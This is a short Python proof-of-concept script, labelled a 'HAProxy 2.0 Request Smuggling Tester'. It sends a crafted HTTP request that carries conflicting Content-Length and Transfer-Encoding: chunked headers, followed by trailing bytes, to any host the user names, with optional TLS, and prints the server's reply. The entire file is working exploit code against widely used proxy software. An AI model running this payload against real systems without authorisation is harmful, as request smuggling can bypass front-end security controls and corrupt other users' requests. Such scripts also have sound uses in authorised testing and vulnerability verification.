import socket
import ssl
import argparse
import logging

def title():
    print(r'''MSR
    ''')

def send_smuggling_payload(host, port, use_https=False):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n\r\n"
        "GARB"
    )

    try:
        sock = socket.create_connection((host, port), timeout=10)
        if use_https:
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)

        sock.sendall(payload.encode())
        response = sock.recv(4096)
        print("[+] Response from HAProxy:\n")
        print(response.decode(errors="ignore"))
        sock.close()

    except Exception as e:
        logging.error(f"[-] Failed to connect or send payload: {e}")

def main():
    parser = argparse.ArgumentParser(description="HAProxy 2.0 Request Smuggling Tester")
    parser.add_argument("host", help="Target host (IP or domain)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--https", action="store_true", help="Use HTTPS (default: HTTP)")
    args = parser.parse_args()

    title()
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    logging.info(f"[+] Target: {args.host}:{args.port} {'(HTTPS)' if args.https else '(HTTP)'}")
    send_smuggling_payload(args.host, args.port, args.https)

if __name__ == "__main__":
    main()
